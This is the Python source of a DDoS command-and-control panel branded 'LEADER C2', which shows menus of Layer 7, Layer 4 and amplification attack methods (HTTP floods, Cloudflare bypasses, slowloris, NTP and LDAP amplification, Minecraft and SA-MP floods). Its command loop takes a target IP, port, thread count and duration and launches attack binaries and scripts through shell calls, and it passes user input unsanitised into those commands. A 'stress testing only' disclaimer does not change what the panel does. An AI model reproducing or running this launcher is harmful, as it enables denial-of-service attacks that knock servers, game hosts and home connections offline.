import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.0)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.0)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.0)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.0)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to LEADER C2 DDoS! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: lht \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.1')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Không Tấn Công gov/edu/gov.vn domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Contact Me For Hotline Or Zalo       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT       \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''
                              
                       ╦  ┌─┐┌─┐┌┬┐┌─┐┬─┐  ╔═╗┌─┐
                       ║  ├┤ ├─┤ ││├┤ ├┬┘  ║  ┌─┘
                       ╩═╝└─┘┴ ┴─┴┘└─┘┴└─  ╚═╝└─┘
              [38;2;25;230;255m╔[38;2;30;225;255m═[38;2;35;220;255m═[38;2;40;215;255m═[38;2;45;210;255m═[38;2;50;205;255m═[38;2;55;200;255m═[38;2;60;195;255m═[38;2;80;175;255m═[38;2;85;170;255m═[38;2;90;165;255m═[38;2;95;160;255m═[38;2;100;155;255m═[38;2;105;150;255m═[38;2;110;145;255m═[38;2;115;140;255m═[38;2;120;135;255m═[38;2;125;130;255m═[38;2;130;125;255m═[38;2;135;120;255m═[38;2;140;115;255m═[38;2;145;110;255m═[38;2;150;105;255m═[38;2;155;100;255m═[38;2;160;95;255m═[38;2;165;90;255m═[38;2;170;85;255m═[38;2;175;80;255m═[38;2;180;75;255m═[38;2;185;70;255m═[38;2;190;65;255m═[38;2;195;60;255m═[38;2;200;55;255m═[38;2;205;50;255m═[38;2;210;45;255m═[38;2;215;40;255m═[38;2;220;35;255m═[38;2;225;30;255m═[38;2;230;25;255m═[38;2;235;20;255m═[38;2;240;15;255m═[38;2;245;10;255m╗
              [38;2;25;230;255m║ \x1b[38;2;255;255;255mHTTP-GET       \x1b[38;2;255;255;255mHTTP-RAW       \x1b[38;2;255;255;255mHTTP-REQ [38;2;245;10;255m║
              [38;2;25;230;255m║ \x1b[38;2;255;255;255mHTTP-BROWSER   \x1b[38;2;255;255;255mHTTP-RAND      \x1b[38;2;255;255;255mHTTP-MIX [38;2;245;10;255m║
              [38;2;25;230;255m║ \x1b[38;2;255;255;255mHTTP-FLOOD     \x1b[38;2;255;255;255mHTTP-SOCKET    \x1b[38;2;255;255;255mSTRESSER [38;2;245;10;255m║
     [38;2;25;230;255m╔════════╩[38;2;30;225;255m═[38;2;35;220;255m═[38;2;40;215;255m═[38;2;45;210;255m═[38;2;50;205;255m═[38;2;55;200;255m═[38;2;60;195;255m═[38;2;80;175;255m═[38;2;85;170;255m═[38;2;90;165;255m═[38;2;95;160;255m═[38;2;100;155;255m═[38;2;105;150;255m═[38;2;110;145;255m═[38;2;115;140;255m═[38;2;120;135;255m═[38;2;125;130;255m═[38;2;130;125;255m═[38;2;135;120;255m═[38;2;140;115;255m═[38;2;145;110;255m═[38;2;150;105;255m═[38;2;155;100;255m═[38;2;160;95;255m═[38;2;165;90;255m═[38;2;170;85;255m═[38;2;175;80;255m═[38;2;180;75;255m═[38;2;185;70;255m═[38;2;190;65;255m═[38;2;195;60;255m═[38;2;200;55;255m═[38;2;205;50;255m═[38;2;210;45;255m═[38;2;215;40;255m═[38;2;220;35;255m═[38;2;225;30;255m═[38;2;230;25;255m═[38;2;235;20;255m═[38;2;240;15;255m═[38;2;245;10;255m╩═[38;2;250;5;255m════[38;2;255;0;255m═══╗
     [38;2;25;230;255m║ \x1b[38;2;255;255;255mHULK         \x1b[38;2;255;255;255m           \x1b[38;2;255;255;255mTLSv2           TLS              [38;2;255;0;255m║
     [38;2;25;230;255m║ \x1b[38;2;255;255;255mSEVER        \x1b[38;2;255;255;255m           \x1b[38;2;255;255;255mCF-TLS          UAM              [38;2;255;0;255m║
     [38;2;25;230;255m║ \x1b[38;2;255;255;255mHTTP-HYPER   \x1b[38;2;255;255;255m           \x1b[38;2;255;255;255mCF-GLACIER      CLOUDFLARE       [38;2;255;0;255m║
     [38;2;25;230;255m║ \x1b[38;2;255;255;255mHTTP-MIXv2   \x1b[38;2;255;255;255m           \x1b[38;2;255;255;255mCF-BYPASS       CF-FLOODER       [38;2;255;0;255m║
     [38;2;25;230;255m╚═════════[38;2;30;225;255m═[38;2;35;220;255m═[38;2;40;215;255m═[38;2;45;210;255m═[38;2;50;205;255m═[38;2;55;200;255m═[38;2;60;195;255m═[38;2;80;175;255m═[38;2;85;170;255m═[38;2;90;165;255m═[38;2;95;160;255m═[38;2;100;155;255m═[38;2;105;150;255m═[38;2;110;145;255m═[38;2;115;140;255m═[38;2;120;135;255m═[38;2;125;130;255m═[38;2;130;125;255m═[38;2;135;120;255m═[38;2;140;115;255m═[38;2;145;110;255m═[38;2;150;105;255m═[38;2;155;100;255m═[38;2;160;95;255m═[38;2;165;90;255m═[38;2;170;85;255m═[38;2;175;80;255m═[38;2;180;75;255m═[38;2;185;70;255m═[38;2;190;65;255m═[38;2;195;60;255m═[38;2;200;55;255m═[38;2;205;50;255m═[38;2;210;45;255m═[38;2;215;40;255m═[38;2;220;35;255m═[38;2;225;30;255m═[38;2;230;25;255m═[38;2;235;20;255m═[38;2;240;15;255m═[38;2;245;10;255m══[38;2;250;5;255m════[38;2;255;0;255m═══╝
            

''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnfo-killer          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudpbypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgod               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslowloris           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mflux              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstdv2               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-amp           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2;LeaDer --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mLEADER DDoS \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to LEADER DDoS C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: TrugZacKer \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOnline : 5/10')
    print("")
    print("""
                    ╦                                                             ╦┌─┐┌─┐┌┬┐┌─┐┬─┐  ╔═╗┌─┐
                    ║  ├┤ ├─┤ ││├┤ ├┬┘  ║  ┌─┘
                    ╩═╝└─┘┴ ┴─┴┘└─┘┴└─  ╚═╝└─┘
                   [38;2;243;12;255mC[38;2;237;18;255mop[38;2;231;24;255my[38;2;225;30;255mri[38;2;219;36;255mgh[38;2;213;42;255mt [38;2;207;48;255m© [38;2;195;60;255m2[38;2;189;66;255m0[38;2;183;72;255m2[38;2;177;78;255m3 [38;2;165;90;255mB[38;2;159;96;255my [38;2;147;108;255mT[38;2;141;114;255mru[38;2;135;120;255mg[38;2;129;126;255mZac[38;2;123;132;255mK[38;2;117;138;255mer
              [38;2;255;0;255m═[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m═╦[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m╦[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═
              [38;2;255;0;255m╔[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m═╩[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m╩[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m╗
          [38;2;255;0;255m╔═══╣  - - \x1b[38;2;255;255;255mWelcome to \x1b[38;2;0;255;0mLEADER DDoS \x1b[38;2;255;255;255mC2 [\x1b[38;2;115;255;248mLHT\x1b[38;2;255;255;255m] [38;2;33;222;255m- - [38;2;33;222;255m╠═══╗
        [38;2;255;0;255m╔═╩═══╩[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m╩═══╩═╗
        [38;2;255;0;255m║ - - - \x1b[38;2;255;0;0m\x1b[9mC2 - LEADER PlanVip\x1b[0m <> \x1b[38;2;255;255;255mMake By [38;2;147;108;255m\033[1;4mTrugZacKer\033[0m [38;2;33;222;255m- - - [38;2;57;198;255m║
        [38;2;255;0;255m╚══════[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m══════╝
        
       [38;2;255;0;255m╔═══════[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═══════╗
       [38;2;255;0;255m║\x1b[38;2;255;255;255m~ [38;2;33;222;255m~ \x1b[38;2;255;255;255m~ [38;2;33;222;255m~ \x1b[38;2;255;255;255m~ \033[1;4m\x1b[38;2;255;234;0mPowerfull Methods Layer7 Bypasses\033[0m \x1b[38;2;255;255;255m~ [38;2;255;0;255m~ \x1b[38;2;255;255;255m~ [38;2;255;0;255m~ \x1b[38;2;255;255;255m~ [38;2;57;198;255m║
       [38;2;255;0;255m║  \x1b[38;2;255;255;255m~ [38;2;33;222;255m~ \x1b[38;2;255;255;255m~ \x1b[38;2;255;255;255mTo Explore Commands Please Type [[38;2;33;222;255mZKT\x1b[38;2;255;255;255m] \x1b[38;2;255;255;255m~ [38;2;255;0;255m~ \x1b[38;2;255;255;255m~  [38;2;57;198;255m║
       [38;2;255;0;255m╚═══════[38;2;249;6;255m═══[38;2;243;12;255m══[38;2;237;18;255m══[38;2;231;24;255m═[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═══════╝


""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[48;2;255;0;255m\x1b[30m[@ADMIN] ● LEADER C2\x1b[0m \x1b[38;2;255;255;255m►''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

